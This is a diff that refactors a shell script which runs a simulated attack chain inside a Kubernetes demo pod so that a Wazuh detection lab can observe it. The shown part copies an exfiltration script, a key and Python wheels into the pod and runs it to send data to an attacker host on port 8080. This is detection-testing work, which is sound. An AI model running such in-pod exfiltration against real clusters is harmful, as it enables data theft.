@@ -10,22 +10,20 @@
 # Chain order (0,1,2,D,3,B,G,4): the pipeline/admission step 0 is covered by the
 # smoke test; this script runs steps 1-4 plus scenarios D, B, G from inside the pod.
 set -uo pipefail
+. "$(git rev-parse --show-toplevel)/scripts/lib/common.sh"
 
 MODE="detect"
 [ "${1:-}" = "--mode" ] && MODE="${2:?}"
-NS="demo"
-REGION="${AWS_REGION:-ap-southeast-1}"
-ROOT="$(git rev-parse --show-toplevel)"
+check_mode "$MODE"
 
-POD="$(kubectl -n "$NS" get pod -l app.kubernetes.io/name=demo-app --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
-[ -n "$POD" ] || { echo "demo-app pod not found; run 'make deploy' first" >&2; exit 1; }
+POD="$(require_demo_pod)" || exit 1
+ATTACKER_IP="$(tf_output attacker_private_ip)"
 
-ATTACKER_IP="$(terraform -chdir="$ROOT/infra/terraform" output -raw attacker_private_ip 2>/dev/null || true)"
-
-ts() { date '+%H:%M:%S'; }
 step() { printf '\n[%s] === %s ===\n' "$(ts)" "$*"; }
 # Run a command inside the demo pod; never fail the whole chain on one step.
-inpod() { kubectl -n "$NS" exec "$POD" -- sh -c "$1" 2>&1 | sed 's/^/    /' || true; }
+inpod() { in_pod "$POD" "$1"; }
+# Copy a local file into the demo pod.
+topod() { kubectl -n "$NS" cp "$1" "$NS/$POD:$2" 2>/dev/null || true; }
 
 echo "Target pod: $POD   mode: $MODE   attacker: ${ATTACKER_IP:-<unknown>}"
 echo "Watch Wazuh: Threat Hunting > Events, filter rule.groups: cipherguard"
@@ -69,15 +67,12 @@ if [ -z "$ATTACKER_IP" ]; then
   echo "    attacker IP unknown (no terraform output); skipping send."
 else
   # Stage exfil.py, the lab public key and (if vendored) the cryptography wheels.
-  kubectl -n "$NS" cp "$ROOT/attack/exfil.py" "$NS/$POD:/tmp/exfil.py" 2>/dev/null || true
-  kubectl -n "$NS" exec "$POD" -- mkdir -p /tmp/keys 2>/dev/null || true
-  kubectl -n "$NS" cp "$ROOT/attack/keys/lab_recipient_pub.pem" "$NS/$POD:/tmp/keys/lab_recipient_pub.pem" 2>/dev/null || true
+  inpod 'mkdir -p /tmp/keys /tmp/pydeps' >/dev/null
+  topod "$ROOT/attack/exfil.py" /tmp/exfil.py
+  topod "$ROOT/attack/keys/lab_recipient_pub.pem" /tmp/keys/lab_recipient_pub.pem
 
   if ls "$ROOT"/attack/vendor/*.whl >/dev/null 2>&1; then
-    kubectl -n "$NS" exec "$POD" -- mkdir -p /tmp/pydeps 2>/dev/null || true
-    for whl in "$ROOT"/attack/vendor/*.whl; do
-      kubectl -n "$NS" cp "$whl" "$NS/$POD:/tmp/pydeps/$(basename "$whl")" 2>/dev/null || true
-    done
+    for whl in "$ROOT"/attack/vendor/*.whl; do topod "$whl" "/tmp/pydeps/$(basename "$whl")"; done
     inpod 'cd /tmp/pydeps && for w in *.whl; do python -c "import zipfile,sys; zipfile.ZipFile(\"$w\").extractall(\".\")"; done; echo "deps unpacked"'
     inpod "CIPHERGUARD_LAB=1 PYTHONPATH=/tmp/pydeps python /tmp/exfil.py --host $ATTACKER_IP --port 8080 --pubkey /tmp/keys/lab_recipient_pub.pem"
   else
